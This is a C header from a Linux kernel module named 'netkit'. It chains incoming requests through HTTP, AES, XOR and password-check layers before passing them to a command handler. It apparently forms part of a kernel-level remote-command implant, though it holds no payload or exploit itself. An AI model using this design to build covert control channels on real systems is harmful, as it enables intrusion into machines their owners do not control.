#ifndef PIPELINE__IFACE_H
#define PIPELINE__IFACE_H

#include <linux/types.h>
#include <linux/kallsyms.h>

#include "../sys/debug.h"
#include "../sys/mem.h"
#include "../cmd/iface.h"

static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);

#include "xor/xor.h"
#include "aes/aes.h"
#include "http/http.h"
#include "auth_password/auth_password.h"

static inline int pipeline_final_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    return cmd_process(req_buf, req_buflen, res_buf, res_buflen);
}

static int (*PIPELINE_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index) = {
    layer_http_process,
    layer_aes_process,
    layer_xor_process,
    layer_auth_password_process,
    pipeline_final_process
};

static inline int _do_call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    return PIPELINE_FUNCTIONS[index](req_buf, req_buflen, res_buf, res_buflen, index);
}

static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    int retv;

#if CONFIG_NETKIT_DEBUG
    char *sym_name;

    // for some reason symbol names are this big???
    sym_name = kzmalloc(1024, GFP_KERNEL);
    if (IS_ERR(sym_name))
        return PTR_ERR(sym_name);

    retv = sprint_symbol(sym_name, (unsigned long)PIPELINE_FUNCTIONS[index]);
    if (retv < 0)
        return retv;

    NETKIT_LOG("[*] calling '%s' (req_buflen: %lu)\n", sym_name, req_buflen);
#endif
    retv = _do_call_next_layer(req_buf, req_buflen, res_buf, res_buflen, index);
#if CONFIG_NETKIT_DEBUG
    NETKIT_LOG("[%c] returned '%s' (res_buflen: %lu, retv: %d)\n", retv >= 0 ? '+' : '!', sym_name, *res_buflen, retv);

    kzfree(sym_name, 1024);
#endif

    return retv;
}

static inline int pipeline_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    // this only returns an error when the first pipeline layer is returning an error
    return call_next_layer(req_buf, req_buflen, res_buf, res_buflen, 0);
}


#endif
